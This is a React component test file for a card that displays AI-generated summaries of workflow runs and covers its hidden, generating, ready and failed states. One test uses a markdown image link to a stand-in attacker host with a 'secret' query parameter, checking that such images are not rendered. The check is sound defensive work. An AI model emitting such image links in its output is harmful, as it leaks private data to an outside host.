import { describe, expect, it, vi } from "vitest";
import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import { RunAiSummaryCard } from "./RunAiSummaryCard";

vi.mock("../config/api", () => ({ generateWorkflowRunAiSummary: vi.fn().mockResolvedValue(undefined) }));
import { generateWorkflowRunAiSummary } from "../config/api";

describe("RunAiSummaryCard", () => {
    it("is hidden for active runs", () => {
        const { container } = render(<RunAiSummaryCard runId={1} runStatus="running" />);
        expect(container).toBeEmptyDOMElement();
    });

    it("offers to summarize a finished run without a summary", async () => {
        render(<RunAiSummaryCard runId={3} runStatus="cancelled" />);
        fireEvent.click(screen.getByRole("button", { name: "Summarize this run" }));
        await waitFor(() => expect(generateWorkflowRunAiSummary).toHaveBeenCalledWith(3));
    });

    it("shows headline, body and engine when ready", () => {
        render(<RunAiSummaryCard runId={1} runStatus="completed"
            summary={{ status: "ready", headline: "Triaged 14 issues", body: "- two escalated",
                engine: "claude-code", model: "haiku" }} />);
        expect(screen.getByText("Triaged 14 issues")).toBeInTheDocument();
        expect(screen.getByText("two escalated")).toBeInTheDocument();
        expect(screen.getByText(/claude-code\/haiku/)).toBeInTheDocument();
        expect(screen.getByRole("button", { name: "Regenerate" })).toBeInTheDocument();
    });

    it("does not render images from the summary body", () => {
        const { container } = render(<RunAiSummaryCard runId={1} runStatus="completed"
            summary={{ status: "ready", headline: "H", body: "see ![leak](https://attacker.example/?q=secret)" }} />);
        expect(container.querySelector("img")).toBeNull();
    });

    it("shows progress while generating", () => {
        render(<RunAiSummaryCard runId={1} runStatus="failed" summary={{ status: "generating" }} />);
        expect(screen.getByText("Generating summary…")).toBeInTheDocument();
    });

    it("shows the error and Retry when failed", () => {
        render(<RunAiSummaryCard runId={1} runStatus="failed" summary={{ status: "failed", error: "timeout" }} />);
        expect(screen.getByText(/timeout/)).toBeInTheDocument();
        expect(screen.getByRole("button", { name: "Retry" })).toBeInTheDocument();
    });
});
